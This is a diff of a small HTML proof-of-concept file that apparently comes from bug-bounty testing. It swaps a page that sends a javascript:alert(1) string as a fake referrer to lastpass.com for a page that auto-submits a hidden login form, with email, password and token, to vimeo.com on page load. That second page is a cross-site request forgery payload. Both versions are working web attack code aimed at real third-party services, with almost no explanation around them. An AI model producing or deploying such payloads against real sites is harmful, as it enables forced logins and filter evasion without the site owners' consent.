@@ -1,40 +1,12 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="referrer" content="unsafe-url">
-    <title>WAF Referrer Test</title>
-</head>
-<body>
+<html>
+<body onload="document.forms[0].submit()">
 
-    <h2>WAF Testing: Referrer Cookie Injection</h2>
-    <p>Click the button to send a request with a payload-like referrer.</p>
-    
-    <button id="trigger">Send Payload to LastPass</button>
-
-    <script>
-        document.getElementById('trigger').addEventListener('click', function() {
-            // We use the string as a "domain" structure.
-            // This is how you force the browser to send it in the header.
-            const target = "https://www.lastpass.com/fr/";
-            
-            // Note: The browser will treat "javascript:alert(1)" as the host.
-            const spoofedOrigin = "https://javascript:alert(1)/";
-
-            /* 
-               Step 1: We must trick the browser into thinking we are on that host.
-               On a real system, this would require DNS poisoning or 'hosts' file entry.
-            */
-            console.log("Attempting to redirect via: " + spoofedOrigin);
-            
-            // To test if the WAF catches the string:
-            window.location.href = target + "?ref=" + encodeURIComponent(spoofedOrigin);
-            
-            // If you want the ACTUAL Referrer Header to change:
-            // history.replaceState(null, null, spoofedOrigin); 
-            // window.location.href = target;
-        });
-    </script>
+<form method="POST" action="https://vimeo.com/log_in">
+    <input type="hidden" name="email" value="testbugbounty@uberip.com">
+    <input type="hidden" name="password" value="Testtest111%27%28%29%40">
+    <input type="hidden" name="token" value="ed75d7fddad65fcedb0a2b04566e2e71dbf5cb5a.dpre7t4d3z.1790710442">
+</form>
 
 </body>
 </html>
